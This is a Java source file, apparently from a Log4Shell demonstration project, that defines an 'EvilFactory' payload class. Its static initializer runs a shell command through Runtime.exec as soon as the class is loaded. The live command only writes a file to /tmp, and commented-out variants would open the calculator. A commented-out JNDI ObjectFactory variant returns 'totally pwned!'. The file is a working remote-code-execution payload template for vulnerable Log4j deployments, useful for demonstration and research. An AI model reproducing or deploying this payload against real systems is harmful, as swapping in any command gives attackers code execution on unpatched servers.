//package info.jerrinot.log4shell.evilfactory;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;


/*
public class EvilFactory implements ObjectFactory {
    private static final String tag = "Log4Shell demo";

    static void log(String msg) {
        System.out.println("[" + tag + "] " + msg);
    }

    static void error(String msg) {
        System.err.println("[" + tag + "] " + msg);
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        log("Log4Shell demo entrypoint");
        error("Log4Shell demo entrypoint");
        return "totally pwned!";
    }
}
*/


public class EvilFactory {
    public EvilFactory() {}
    static {
        System.err.println("Hello world");
        System.err.flush();
        try {
            /*
            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                    ? new String[]{"cmd.exe","/c", "calc.exe"}
                    : new String[]{"open","/System/Applications/Calculator.app"};
            */
            //String[] cmds = new String[]{"/bin/echo","'#####'"};
            String[] cmds = new String[]{"/bin/bash", "-c", "echo abc > /tmp/abc"};
            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
        } catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        EvilFactory e = new EvilFactory();
    }
}
